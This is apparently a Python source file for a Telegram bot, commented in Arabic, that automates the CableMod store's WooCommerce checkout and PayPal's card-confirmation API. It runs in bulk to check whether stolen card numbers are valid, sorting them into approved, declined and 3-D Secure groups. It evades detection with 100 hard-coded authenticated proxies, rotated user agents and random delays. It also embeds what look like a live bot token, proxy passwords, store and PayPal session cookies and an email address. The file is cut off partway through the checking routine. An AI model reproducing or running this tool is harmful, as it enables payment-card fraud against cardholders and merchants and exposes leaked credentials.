# -*- coding: utf-8 -*-
"""
CableMod + PayPal PPCP - Telegram Bot
البروكسيات مدمجة + حل مشكلة "فشل في استخراج update_order_review_nonce"
"""

import os
import re
import json
import time
import random
import asyncio
import requests
from datetime import datetime
from urllib.parse import urlencode, unquote
from typing import Optional, Dict, Tuple
from itertools import cycle

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ====== إعدادات البوت ======
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]
CHANNEL_ID = -1003154179190

# ====== إعدادات الموقع ======
BASE_URL = "https://store.cablemod.com/"
CART_URL = BASE_URL + "cart/"
CHECKOUT_URL = BASE_URL + "checkout/"

# User Agents عشوائية
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
]

# الكوكيز الثابتة (مهمة جدًا!)
INITIAL_COOKIES = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_first_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%2010%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    '_fbp': 'fb.1.1761693482072.783059716330931642',
    '_ga': 'GA1.1.543617456.1761693483',
    'woocommerce_items_in_cart': '1',
    'woocommerce_recently_viewed': '1902265',
    'wordpress_logged_in_ed7813b5c1349c2f14d2f89aad48ec92': 'i0ket57dzb%7C1762908222%7Cjsh0lltx9PceoroQvpEOSGJ37HkKuBm16eDRVujmwwjq%7C58f193d4befcde327b8e1a1c0d16308a4974ce1e013aa70c85fffedd81ffc6eb',
    'wp_woocommerce_session_ed7813b5c1349c2f14d2f89aad48ec92': '114471%7C1761866332%7C1761779932%7C%24generic%24FzmPQxa-1erHcRmPGoP-Y-huTFjZ7ndfiApBJIEk',
    '_gcl_au': '1.1.1373112383.1761693482.1617057511.1761696403.1761698675',
    'woocommerce_cart_hash': '59b29a9c285b9235836a077996070a0f',
}

PAYPAL_COOKIES = {
    'enforce_policy': 'ccpa',
    'cookie_check': 'yes',
    'd_id': '52077666bd0b44258e7657ae8cb8e5bf1761605157957',
    'login_email': 'margiefos.ter7.0.1.83%40gmail.com',
    'LANG': 'en_US%3BUS',
    'TfXMWj95u2_Zf1Kmv_GCUOjlGG8': 'cvD9-96tABIM4Poym3Ti_T78QGNFcJqhBbQe6D-SUPN4BoQVLfICsIfqObYSm3dzZYYtVa63PS6nuoeXinbmhrH6XnOKBMtvuyX5LYdoN7rYG238yRymHuXF8Q-TSLrnAOv9ATNFCL6S0sWU4yz8V4YI6BSqFbRrz1sWKn1yrjv30AfGgvb78qo3usq',
    'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
    'ui_experience': 'did_set%3Dtrue%26login_type%3DEMAIL_PASSWORD%26home%3D3',
    'fn_dt': 'f78a16c47c9a4c31a4c9ea7903c6f1d4',
    'rmuc': 'OwAwuW-Vyed6BRvi6Gkk7ORgUHzp-64GENTf3U0lSkV1sce6mM5SWN7M_YuVXfAa0Kqm_3PdFZOnMPhElXeoL0iHiuPG9PH2YPVEmyT_4z6ArEMEVw3wl1_c9Zokod5ye545H5nGUQ0j9oO8bp_DpNmM1ZuOGh_5MU7GuWJHEo300CPO1ksqDrUAkprfnM9X3k3B0aECgQbDPcotu9fm0tfd8um',
    'X-PP-ADS': 'AToBEvb.aFi8BXurJKvSIyunxGo.bh47ASv2.2j-Pe0CHD41-xAGV-C9M-teOwEd9.9oaVKC36uQwjNZd7J2OptS1w',
    'nsid': 's%3AeeYy88H2oBb9GbcyszOjKk2QbiAGb9hq.WvuvZARfWO4Bk7bXI1S%2FSIxWTD%2BuYOU0h%2Bhh4anVXsA',
    '_ga': 'GA1.1.948625281.1761605189',
    'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'whZ4Q-pT4zAOWrP5smSLQG-PjwjkfC-cCGONV1Xs6zrY3Z4Rn4C4XqDefGl3duxYq80A-5UFoTV78teM',
    'sc_f': 'UkcitVVSun6MogqMKdSPNRHq7u29vzA5Yp02abKnWu0PRTCwph8jJpmSUJDogTGs4H_1gWPJO6jMwQVuXnmhSbj1613ODnFW5ckSiW',
}

# بيانات الفاتورة
BILLING = {
    "billing_first_name": "saad",
    "billing_last_name": "saad",
    "billing_country": "US",
    "billing_address_1": "111 North Street",
    "billing_city": "Napoleon",
    "billing_state": "AK",
    "billing_postcode": "49261-9011",
    "billing_email": "i0ket57dzb@illubd.com",
}

SHIPPING = {
    "country": "US",
    "state": "AK",
    "postcode": "49261-9011",
    "city": "Napoleon",
    "address": "111 North Street",
    "address_2": ""
}

PAYMENT_METHOD = "ppcp-credit-card-gateway"

# ====== البروكسيات مدمجة (100 بروكسي) ======
PROXIES_LIST = [
    "82.21.224.53:6409:wikniadi:5nhj034pwe2b",
    "82.29.229.58:6413:wikniadi:5nhj034pwe2b",
    "82.25.216.252:7094:wikniadi:5nhj034pwe2b",
    "23.27.184.56:5657:wikniadi:5nhj034pwe2b",
    "23.27.138.191:6292:wikniadi:5nhj034pwe2b",
    "82.22.210.10:7852:wikniadi:5nhj034pwe2b",
    "23.27.184.66:5667:wikniadi:5nhj034pwe2b",
    "82.21.224.144:6500:wikniadi:5nhj034pwe2b",
    "23.27.138.3:6104:wikniadi:5nhj034pwe2b",
    "82.24.224.121:5477:wikniadi:5nhj034pwe2b",
    "23.27.138.52:6153:wikniadi:5nhj034pwe2b",
    "23.27.138.7:6108:wikniadi:5nhj034pwe2b",
    "82.25.216.253:7095:wikniadi:5nhj034pwe2b",
    "82.29.225.124:5979:wikniadi:5nhj034pwe2b",
    "82.29.225.234:6089:wikniadi:5nhj034pwe2b",
    "46.203.159.11:6612:wikniadi:5nhj034pwe2b",
    "23.27.184.19:5620:wikniadi:5nhj034pwe2b",
    "82.25.216.58:6900:wikniadi:5nhj034pwe2b",
    "82.29.229.17:6372:wikniadi:5nhj034pwe2b",
    "82.29.225.147:6002:wikniadi:5nhj034pwe2b",
    "82.25.216.82:6924:wikniadi:5nhj034pwe2b",
    "82.29.225.162:6017:wikniadi:5nhj034pwe2b",
    "82.22.220.147:5502:wikniadi:5nhj034pwe2b",
    "82.29.226.49:7391:wikniadi:5nhj034pwe2b",
    "82.22.217.78:5420:wikniadi:5nhj034pwe2b",
    "82.29.226.142:7484:wikniadi:5nhj034pwe2b",
    "23.27.184.34:5635:wikniadi:5nhj034pwe2b",
    "82.22.210.191:8033:wikniadi:5nhj034pwe2b",
    "46.203.159.219:6820:wikniadi:5nhj034pwe2b",
    "82.24.224.176:5532:wikniadi:5nhj034pwe2b",
    "82.24.224.214:5570:wikniadi:5nhj034pwe2b",
    "82.29.226.141:7483:wikniadi:5nhj034pwe2b",
    "23.27.138.141:6242:wikniadi:5nhj034pwe2b",
    "46.203.159.243:6844:wikniadi:5nhj034pwe2b",
    "82.29.225.96:5951:wikniadi:5nhj034pwe2b",
    "23.27.138.4:6105:wikniadi:5nhj034pwe2b",
    "82.21.224.55:6411:wikniadi:5nhj034pwe2b",
    "23.27.138.174:6275:wikniadi:5nhj034pwe2b",
    "82.22.220.98:5453:wikniadi:5nhj034pwe2b",
    "82.25.216.243:7085:wikniadi:5nhj034pwe2b",
    "23.27.184.65:5666:wikniadi:5nhj034pwe2b",
    "82.21.224.157:6513:wikniadi:5nhj034pwe2b",
    "23.27.184.126:5727:wikniadi:5nhj034pwe2b",
    "82.22.220.19:5374:wikniadi:5nhj034pwe2b",
    "66.63.180.86:5610:wikniadi:5nhj034pwe2b",
    "82.29.225.186:6041:wikniadi:5nhj034pwe2b",
    "82.27.214.80:6422:wikniadi:5nhj034pwe2b",
    "82.21.224.4:6360:wikniadi:5nhj034pwe2b",
    "82.22.210.232:8074:wikniadi:5nhj034pwe2b",
    "23.27.138.106:6207:wikniadi:5nhj034pwe2b",
    "82.29.226.36:7378:wikniadi:5nhj034pwe2b",
    "82.29.226.25:7367:wikniadi:5nhj034pwe2b",
    "82.29.226.157:7499:wikniadi:5nhj034pwe2b",
    "82.22.217.47:5389:wikniadi:5nhj034pwe2b",
    "82.24.224.150:5506:wikniadi:5nhj034pwe2b",
    "82.27.214.169:6511:wikniadi:5nhj034pwe2b",
    "82.29.226.160:7502:wikniadi:5nhj034pwe2b",
    "82.21.224.129:6485:wikniadi:5nhj034pwe2b",
    "23.27.138.102:6203:wikniadi:5nhj034pwe2b",
    "82.22.217.21:5363:wikniadi:5nhj034pwe2b",
    "82.29.225.57:5912:wikniadi:5nhj034pwe2b",
    "82.22.217.251:5593:wikniadi:5nhj034pwe2b",
    "82.25.216.216:7058:wikniadi:5nhj034pwe2b",
    "46.203.159.236:6837:wikniadi:5nhj034pwe2b",
    "82.22.210.148:7990:wikniadi:5nhj034pwe2b",
    "82.22.210.117:7959:wikniadi:5nhj034pwe2b",
    "82.21.224.110:6466:wikniadi:5nhj034pwe2b",
    "82.22.217.246:5588:wikniadi:5nhj034pwe2b",
    "23.27.184.248:5849:wikniadi:5nhj034pwe2b",
    "46.203.159.89:6690:wikniadi:5nhj034pwe2b",
    "46.203.159.145:6746:wikniadi:5nhj034pwe2b",
    "82.27.214.125:6467:wikniadi:5nhj034pwe2b",
    "82.22.220.158:5513:wikniadi:5nhj034pwe2b",
    "82.22.217.234:5576:wikniadi:5nhj034pwe2b",
    "82.22.220.208:5563:wikniadi:5nhj034pwe2b",
    "82.22.210.222:8064:wikniadi:5nhj034pwe2b",
    "82.25.216.172:7014:wikniadi:5nhj034pwe2b",
    "82.25.216.37:6879:wikniadi:5nhj034pwe2b",
    "82.29.225.168:6023:wikniadi:5nhj034pwe2b",
    "82.24.224.238:5594:wikniadi:5nhj034pwe2b",
    "82.25.216.201:7043:wikniadi:5nhj034pwe2b",
    "23.27.138.224:6325:wikniadi:5nhj034pwe2b",
    "82.21.224.116:6472:wikniadi:5nhj034pwe2b",
    "82.22.220.43:5398:wikniadi:5nhj034pwe2b",
    "82.29.225.240:6095:wikniadi:5nhj034pwe2b",
    "82.21.224.119:6475:wikniadi:5nhj034pwe2b",
    "82.24.224.202:5558:wikniadi:5nhj034pwe2b",
    "82.22.210.91:7933:wikniadi:5nhj034pwe2b",
    "82.22.210.79:7921:wikniadi:5nhj034pwe2b",
    "82.29.226.220:7562:wikniadi:5nhj034pwe2b",
    "23.27.184.224:5825:wikniadi:5nhj034pwe2b",
    "82.21.224.251:6607:wikniadi:5nhj034pwe2b",
    "82.29.225.230:6085:wikniadi:5nhj034pwe2b",
    "23.27.184.40:5641:wikniadi:5nhj034pwe2b",
    "23.27.184.77:5678:wikniadi:5nhj034pwe2b",
    "82.29.226.113:7455:wikniadi:5nhj034pwe2b",
    "82.22.217.83:5425:wikniadi:5nhj034pwe2b",
    "66.63.180.183:5707:wikniadi:5nhj034pwe2b",
    "82.27.214.77:6419:wikniadi:5nhj034pwe2b",
    "82.24.224.249:5605:wikniadi:5nhj034pwe2b"
]

# ====== إعدادات البروكسي ======
PROXIES_POOL = []
PROXY_CYCLE = None
PROXY_UPDATE_COUNTER = 0
PROXY_UPDATE_INTERVAL = 50

def load_random_proxies(count=30):
    global PROXIES_POOL, PROXY_CYCLE
    selected = random.sample(PROXIES_LIST, min(count, len(PROXIES_LIST)))
    PROXIES_POOL = selected
    PROXY_CYCLE = cycle(selected)
    print(f"[+] تم تحميل {len(selected)} بروكسي عشوائي.")

def get_current_proxy():
    if PROXY_CYCLE is None:
        load_random_proxies()
    proxy_line = next(PROXY_CYCLE)
    ip, port, user, pwd = proxy_line.split(':')
    proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
    return {"http": proxy_url, "https": proxy_url}

# ====== إحصائيات البوت ======
stats = {
    'total': 0, 'checking': 0, 'approved': 0, 'rejected': 0, 'secure_3d': 0, 'errors': 0,
    'start_time': None, 'is_running': False, 'dashboard_message_id': None, 'chat_id': None,
    'current_card': '', 'error_details': {}, 'last_response': 'Waiting...',
    'cards_checked': 0, 'approved_cards': [], '3ds_cards': [], 'declined_cards': [],
}

# ====== دالات مساعدة ======
def find(text: str, pattern: str, flags=re.S) -> Optional[str]:
    m = re.search(pattern, text, flags)
    return m.group(1) if m else None

def extract_nonces(html: str) -> Dict[str, Optional[str]]:
    nonces = {}
    nonces["update_order_review_nonce"] = (
        find(html, r'name=["\']update_order_review_nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
        or find(html, r'update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I)
    )
    nonces["process_checkout_nonce"] = (
        find(html, r'id=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
        or find(html, r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
    )
    nonces["ppcp_nonce"] = (
        find(html, r'"data_client_id"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
        or find(html, r'"ppcp[^"]*data_client_id[^"]*"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
    )
    nonces["create_order_nonce"] = (
        find(html, r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
        or find(html, r'"create_order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
        or find(html, r'ppc_create_order[^}]*nonce["\s:]*"([a-f0-9]+)"')
        or find(html, r'wc_ajax_url[^}]{0,200}nonce["\s:]*"([a-f0-9]+)"', re.S)
    )
    return nonces

def parse_card(card_str: str) -> Tuple[str, str, str, str]:
    parts = card_str.strip().split('|')
    if len(parts) != 4:
        raise ValueError("تنسيق الكارت غير صحيح! استخدم: CC|MM|YYYY|CVV")
    number, month, year, cvv = parts
    number = number.strip()
    month = month.strip().zfill(2)
    year = year.strip()
    cvv = cvv.strip()
    if len(cvv) == 2:
        cvv = cvv.zfill(3)
    if len(number) < 13 or len(number) > 19:
        raise ValueError(f"رقم الكارت غير صحيح: {number}")
    if len(cvv) < 3 or len(cvv) > 4:
        raise ValueError(f"CVV غير صحيح: {cvv}")
    if len(year) != 4:
        raise ValueError(f"السنة غير صحيحة: {year}")
    if not (1 <= int(month) <= 12):
        raise ValueError(f"الشهر غير صحيح: {month}")
    return number, cvv, year, month

# ====== فئة معالجة الدفع (محدثة) ======
class WooCommercePayPal:
    shared_nonces = {}
    shared_paypal_token = None
    shared_update_counter = 0
    UPDATE_INTERVAL = 50

    def __init__(self):
        self.sess = requests.Session()
        self.paypal_sess = requests.Session()

        proxy = get_current_proxy()
        self.sess.proxies.update(proxy)
        self.paypal_sess.proxies.update(proxy)

        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        self.sess.mount('http://', adapter)
        self.sess.mount('https://', adapter)
        self.paypal_sess.mount('http://', adapter)
        self.paypal_sess.mount('https://', adapter)

        self.sess.cookies.update(INITIAL_COOKIES)
        self.paypal_sess.cookies.update(PAYPAL_COOKIES)
        self.nonces = {}
        self.paypal_token = None
        self.paypal_order_id = None
        self.client_metadata_id = None
        self._load_shared_data()

    def _load_shared_data(self):
        if WooCommercePayPal.shared_nonces:
            self.nonces = WooCommercePayPal.shared_nonces.copy()
        if WooCommercePayPal.shared_paypal_token:
            self.paypal_token = WooCommercePayPal.shared_paypal_token

    def _save_shared_data(self):
        WooCommercePayPal.shared_nonces = self.nonces.copy()
        WooCommercePayPal.shared_paypal_token = self.paypal_token

    def _needs_update(self):
        return WooCommercePayPal.shared_update_counter % self.UPDATE_INTERVAL == 0

    def headers_get(self):
        return {
            "user-agent": random.choice(USER_AGENTS),
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": BASE_URL,
            "upgrade-insecure-requests": "1",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
        }

    def headers_ajax(self, json_content=False):
        h = {
            "user-agent": random.choice(USER_AGENTS),
            "accept": "*/*",
            "origin": BASE_URL.rstrip("/"),
            "referer": CHECKOUT_URL,
            "x-requested-with": "XMLHttpRequest",
            "accept-language": "en-US,en;q=0.9",
        }
        h["content-type"] = "application/json" if json_content else "application/x-www-form-urlencoded; charset=UTF-8"
        return h

    def step1_get_checkout(self, force=False):
        if not force and self.nonces.get("update_order_review_nonce"):
            return

        # 1. اذهب للـ cart
        r = self.sess.get(CART_URL, headers=self.headers_get(), timeout=30)
        r.raise_for_status()

        # 2. ابحث عن زر "Proceed to checkout"
        checkout_match = re.search(r'<a[^>]+class=["\'][^"\']*checkout-button[^"\']*["\'][^>]+href=["\']([^"\']+)["\']', r.text, re.I)
        if checkout_match:
            url = checkout_match.group(1)
            if not url.startswith("http"):
                url = BASE_URL.rstrip("/") + "/" + url.lstrip("/")
            r = self.sess.get(url, headers=self.headers_get(), timeout=30)
        else:
            r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
        
        r.raise_for_status()
        html = r.text

        # 3. استخرج الـ nonces
        self.nonces = extract_nonces(html)

        # 4. لو مفيش → ريفريش
        if not self.nonces.get("update_order_review_nonce"):
            print("[!] مفيش update_order_review_nonce → جاري ريفريش...")
            time.sleep(2)
            r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
            r.raise_for_status()
            self.nonces = extract_nonces(r.text)

        if not self.nonces.get("update_order_review_nonce"):
            raise Exception("فشل في استخراج update_order_review_nonce بعد المحاولات")

        self._save_shared_data()
        return html

    def step2_update_order_review(self):
        post_data = {
            "wc_order_attribution_source_type": "organic",
            "_wp_http_referer": "/checkout/",
            "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", ""),
            "payment_method": PAYMENT_METHOD,
            **BILLING
        }
        payload = {
            "security": self.nonces["update_order_review_nonce"],
            "payment_method": PAYMENT_METHOD,
            "has_full_address": "true",
            **SHIPPING,
            "post_data": urlencode(post_data),
        }
        r = self.sess.post(
            BASE_URL,
            params={"wc-ajax": "update_order_review"},
            headers=self.headers_ajax(),
            data=urlencode(payload),
            timeout=30
        )
        try:
            return r.json()
        except:
            return None

    def step3_get_paypal_token(self, force=False):
        if not force and self.paypal_token:
            return self.paypal_token
        html = self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text
        fresh_nonces = extract_nonces(html)
        if fresh_nonces.get("ppcp_nonce"):
            self.nonces["ppcp_nonce"] = fresh_nonces["ppcp_nonce"]
        r = self.sess.post(
            BASE_URL,
            params={"wc-ajax": "ppc-data-client-id"},
            headers=self.headers_ajax(json_content=True),
            json={"nonce": self.nonces["ppcp_nonce"]},
            timeout=30
        )
        try:
            result = r.json()
            token_str = result.get("token", "")
            import base64
            access_token = None
            try:
                parts = token_str.split('.')
                if len(parts) >= 2:
                    payload_b64 = parts[1]
                    padding = 4 - len(payload_b64) % 4
                    if padding != 4:
                        payload_b64 += '=' * padding
                    payload_decoded = base64.urlsafe_b64decode(payload_b64)
                    payload_json = json.loads(payload_decoded)
                    if "paypal" in payload_json:
                        access_token = payload_json["paypal"].get("accessToken")
                        if access_token:
                            result["access_token"] = access_token
            except:
                pass
            if not access_token:
                try:
                    buttons_url = (
                        "https://www.paypal.com/smart/buttons?"
                        "clientID=Abf7famM34IoBZ5AgmTVk2Jfr7cEGOYYSIRvLlkSsrql09p3frXjC-WfFdXxsRkJEVIy_HG35IPnNzbk"
                        "&currency=USD&intent=capture&commit=true&vault=false"
                        "&components.0=buttons&components.1=card-fields"
                        "&locale.country=US&locale.lang=en"
                        "&env=production&platform=desktop"
                    )
                    buttons_headers = {
                        'user-agent': random.choice(USER_AGENTS),
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'referer': 'https://store.cablemod.com/',
                    }
                    r_buttons = self.paypal_sess.get(buttons_url, headers=buttons_headers, timeout=30)
                    if r_buttons.status_code == 200:
                        pattern = r'"facilitatorAccessToken":"([^"]+)"'
                        match = re.search(pattern, r_buttons.text)
                        if match:
                            facilitator_token = match.group(1)
                            result["access_token"] = facilitator_token
                except:
                    pass
            self.paypal_token = result
            self._save_shared_data()
            return result
        except:
            raise

    def step4_create_paypal_order(self):
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            if not self.nonces.get("create_order_nonce"):
                html = self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text
                patterns = [
                    r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
                    r'ppc_create_order[^}]{0,200}["\']nonce["\']\s*:\s*["\']([a-f0-9]+)["\']',
                    r'wc_ppcp_create_order[^}]{0,300}["\']nonce["\']\s*:\s*["\']([a-f0-9]+)["\']',
                    r'data-nonce=["\']([a-f0-9]+)["\'][^>]*ppc-create-order',
                    r'<script[^>]*>.*?nonce["\s:]+["\']([a-f0-9]{10})["\'].*?</script>',
                ]
                for pattern in patterns:
                    nonce = find(html, pattern, re.S)
                    if nonce and len(nonce) == 10:
                        self.nonces["create_order_nonce"] = nonce
                        break
                if not self.nonces.get("create_order_nonce"):
                    if self.nonces.get("ppcp_nonce"):
                        self.nonces["create_order_nonce"] = self.nonces["ppcp_nonce"]
                    else:
                        time.sleep(1)
                        continue
            break
        wp_session = None
        for cookie in self.sess.cookies:
            if cookie.name.startswith("wp_woocommerce_session_"):
                wp_session = unquote(cookie.value)
                break
        customer_id = wp_session.split("|")[0] if wp_session else "guest"
        form_encoded = urlencode({
            "wc_order_attribution_source_type": "organic",
            "wc_order_attribution_referrer": "https://www.google.com/",
            "wc_order_attribution_utm_campaign": "(none)",
            "wc_order_attribution_utm_source": "google",
            "wc_order_attribution_utm_medium": "organic",
            "wc_order_attribution_session_entry": "https://cablemod.com/",
            "billing_first_name": BILLING["billing_first_name"],
            "billing_last_name": BILLING["billing_last_name"],
            "billing_email": BILLING["billing_email"],
            "billing_country": BILLING["billing_country"],
            "billing_address_1": BILLING["billing_address_1"],
            "billing_city": BILLING["billing_city"],
            "billing_state": BILLING["billing_state"],
            "billing_postcode": BILLING["billing_postcode"],
            "shipping_method[0]": "flexible_shipping_single:27",
            "payment_method": PAYMENT_METHOD,
            "terms": "on",
            "terms-field": "1",
            "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", ""),
            "_wp_http_referer": "/checkout/",
        })
        payload = {
            "nonce": self.nonces.get("create_order_nonce", ""),
            "payer": {
                "email_address": BILLING["billing_email"],
                "name": {
                    "surname": BILLING["billing_last_name"],
                    "given_name": BILLING["billing_first_name"],
                },
                "address": {
                    "country_code": BILLING["billing_country"],
                    "address_line_1": BILLING["billing_address_1"],
                    "admin_area_1": BILLING["billing_state"],
                    "admin_area_2": BILLING["billing_city"],
                    "postal_code": BILLING["billing_postcode"],
                },
            },
            "bn_code": "Woo_PPCP",
            "context": "checkout",
            "order_id": "0",
            "payment_method": PAYMENT_METHOD,
            "form_encoded": form_encoded,
            "createaccount": False,
            "save_payment_method": False,
        }
        r = self.sess.post(
            BASE_URL,
            params={"wc-ajax": "ppc-create-order"},
            headers=self.headers_ajax(json_content=True),
            json=payload,
            timeout=30
        )
        try:
            result = r.json()
            if result.get("success"):
                self.paypal_order_id = result["data"]["id"]
                self.client_metadata_id = result["data"].get("custom_id", f"pcp_customer_{customer_id}")
                return result
            else:
                raise Exception("Failed to create order")
        except:
            raise

    def step5_confirm_payment(self, card_number: str, cvv: str, year: str, month: str):
        access_token = None
        if isinstance(self.paypal_token, dict):
            access_token = self.paypal_token.get("access_token")
            if not access_token:
                token_str = self.paypal_token.get("token", "")
                import base64
                try:
                    parts = token_str.split('.')
                    if len(parts) >= 2:
                        payload_b64 = parts[1]
                        padding = 4 - len(payload_b64) % 4
                        if padding != 4:
                            payload_b64 += '=' * padding
                        decoded = base64.urlsafe_b64decode(payload_b64)
                        data = json.loads(decoded)
                        if "paypal" in data and isinstance(data["paypal"], dict):
                            access_token = data["paypal"].get("accessToken")
                except:
                    pass
        if not access_token:
            raise Exception("No access token available")
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': random.choice(USER_AGENTS),
            'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/smart/card-field',
            'accept-language': 'en-US,en;q=0.9',
            'dnt': '1',
            'priority': 'u=1, i',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'authorization': f'Bearer {access_token}',
        }
        if self.client_metadata_id:
            headers['paypal-client-metadata-id'] = self.client_metadata_id
            headers['paypal-partner-attribution-id'] = 'Woo_PPCP'
        headers['fn_sync_data'] = '%7B%22SC_VERSION%22%3A%222.0.4%22%7D'
        payload = {
            'payment_source': {
                'card': {
                    'number': card_number,
                    'security_code': cvv,
                    'expiry': f'{year}-{month}',
                },
            },
        }
        r = self.paypal_sess.post(
            f'https://www.paypal.com/v2/checkout/orders/{self.paypal_order_id}/confirm-payment-source',
            headers=headers,
            json=payload,
            timeout=30
        )
        try:
            result = r.json()
            payer_action_link = None
            for link in result.get("links", []):
                if link.get("rel") == "payer-action":
                    payer_action_link = link.get("href")
                    break
            return result, payer_action_link
        except:
            raise

    def step6_3ds_verification(self):
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'user-agent': random.choice(USER_AGENTS),
            'origin': 'https://www.paypal.com',
            'referer': f'https://www.paypal.com/heliosnext/threeDS?cart_id={self.paypal_order_id}',
        }
        payload = {'token': self.paypal_order_id, 'action': 'verify'}
        r1 = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/session', headers=headers, json=payload, timeout=30)
        ddc_jwt = r1.json().get("ddcJwtData")
        if ddc_jwt:
            self.paypal_sess.post('https://www.paypal.com/payment-authentication/threeds/v1/init-method',
                                  headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': random.choice(USER_AGENTS)},
                                  data={'JWT': ddc_jwt}, timeout=30)
        lookup_payload = {
            'token': self.paypal_order_id, 'action': 'verify',
            'deviceInfo': {'windowSize': '_500_x_600', 'javaEnabled': False, 'language': 'en', 'colorDepth': 24,
                           'screenHeight': 535, 'screenWidth': 450, 'userAgent': random.choice(USER_AGENTS), 'timeZoneOffset': -180,
                           'deviceInfo': 'COMPUTER'}
        }
        r3 = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/lookup', headers=headers, json=lookup_payload, timeout=30)
        res = r3.json()
        return res

# ====== فحص البطاقة ======
async def check_card(card: str, bot_app):
    global PROXY_UPDATE_COUNTER
    try:
        await asyncio.sleep(random.uniform(1, 3))  # تأخير عشوائي
        card_number, cvv, year, month = parse_card(card)
        masked_card = f"{card_number[:6]}******{card_number[-4:]}"
        processor = WooCommercePayPal()
        force_update = processor._needs_update()
        processor.step1_get_checkout(force=force_update)
        await asyncio.sleep(0.5)
        processor.step2_update_order_review()
        await asyncio.sleep(0.5)
        processor.step3_get_paypal_token(force=force_update)
        await asyncio.sleep(0.5)
        processor.step4_create_paypal_order()
        await asyncio.sleep(0.5)
        payment_result, payer_action_link = processor.step5_confirm_payment(card_number, cvv, year, month)
        status = payment_result.get("status", "UNKNOWN")

        WooCommercePayPal.shared_update_counter += 1
        PROXY_UPDATE_COUNTER += 1
        if PROXY_UPDATE_COUNTER >= PROXY_UPDATE_INTERVAL:
            load_random_proxies(30)
            PROXY_UPDATE_COUNTER = 0
